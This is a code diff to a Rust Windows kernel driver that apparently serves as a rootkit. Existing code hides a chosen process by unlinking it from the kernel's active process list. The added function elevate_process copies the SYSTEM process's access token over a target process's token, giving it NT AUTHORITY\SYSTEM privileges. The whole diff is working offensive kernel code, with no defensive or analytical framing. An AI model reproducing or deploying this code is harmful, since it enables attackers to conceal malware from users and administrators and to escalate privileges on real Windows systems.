@@ -1,10 +1,17 @@
 
 use alloc::string::{String, ToString};
-use wdk_sys::LIST_ENTRY;
-use wdk_sys::HANDLE;
+use wdk_sys::{HANDLE, LIST_ENTRY, PEPROCESS, NTSTATUS, STATUS_SUCCESS};
+use wdk_sys::ntddk::PsLookupProcessByProcessId;
+use wdk::println;
 
-mod shadowed_process;
-use shadowed_process::ShadowedProcess;
+use alloc::format;
+use core::ptr;
+use core::ffi::c_void;
+
+mod target_process;
+use target_process::TargetProcess;
+
+
 
 extern "system" {
     fn PsGetCurrentProcess() -> HANDLE ;
@@ -13,7 +20,7 @@ extern "system" {
 
 pub fn shadow_process(target_pid: u32) -> Result<bool,String> {
     unsafe {
-        let current_process = ShadowedProcess::from_eprocess(PsGetCurrentProcess());
+        let current_process = TargetProcess::from_eprocess(PsGetCurrentProcess());
         if (*current_process.pid) == target_pid {
             
             match remove_links(current_process.list_entry){
@@ -85,4 +92,39 @@ unsafe fn remove_links(current: *mut LIST_ENTRY) -> Result<bool,String> {
     (*current).Flink = current_active_process_links;
 
     return Ok(true);
+}
+
+pub fn elevate_process(target_pid: u32) -> Result<bool, String> {
+    unsafe {
+        let mut process: PEPROCESS = ptr::null_mut();
+        let mut system_process: PEPROCESS = ptr::null_mut();
+
+        let mut status: NTSTATUS = PsLookupProcessByProcessId(target_pid as HANDLE, &mut process);
+        
+        if status != STATUS_SUCCESS {
+            return Err(format!("Target Process PID: {} Not found !", target_pid).to_string());
+        }
+
+        status = PsLookupProcessByProcessId(0x4 as HANDLE, &mut system_process);
+
+        // Just in case
+        if status != STATUS_SUCCESS {
+            return Err("Failed to get a handle to SYSTEM Process".to_string());
+        }
+
+        let target_process = TargetProcess::from_eprocess(process as *mut c_void);
+        let system_target_process = TargetProcess::from_eprocess(system_process as *mut c_void);
+
+        let token_address: *mut usize = target_process.token;
+
+        let system_token_address: *mut usize = system_target_process.token;
+
+
+        *token_address = *system_token_address;
+        println!("[+] Process {:?} ({:?}) Token Updated to NT AUTHORITY\\SYSTEM !", target_process.image_file_name, target_pid);
+
+
+
+        return Ok(true);
+    }
 }
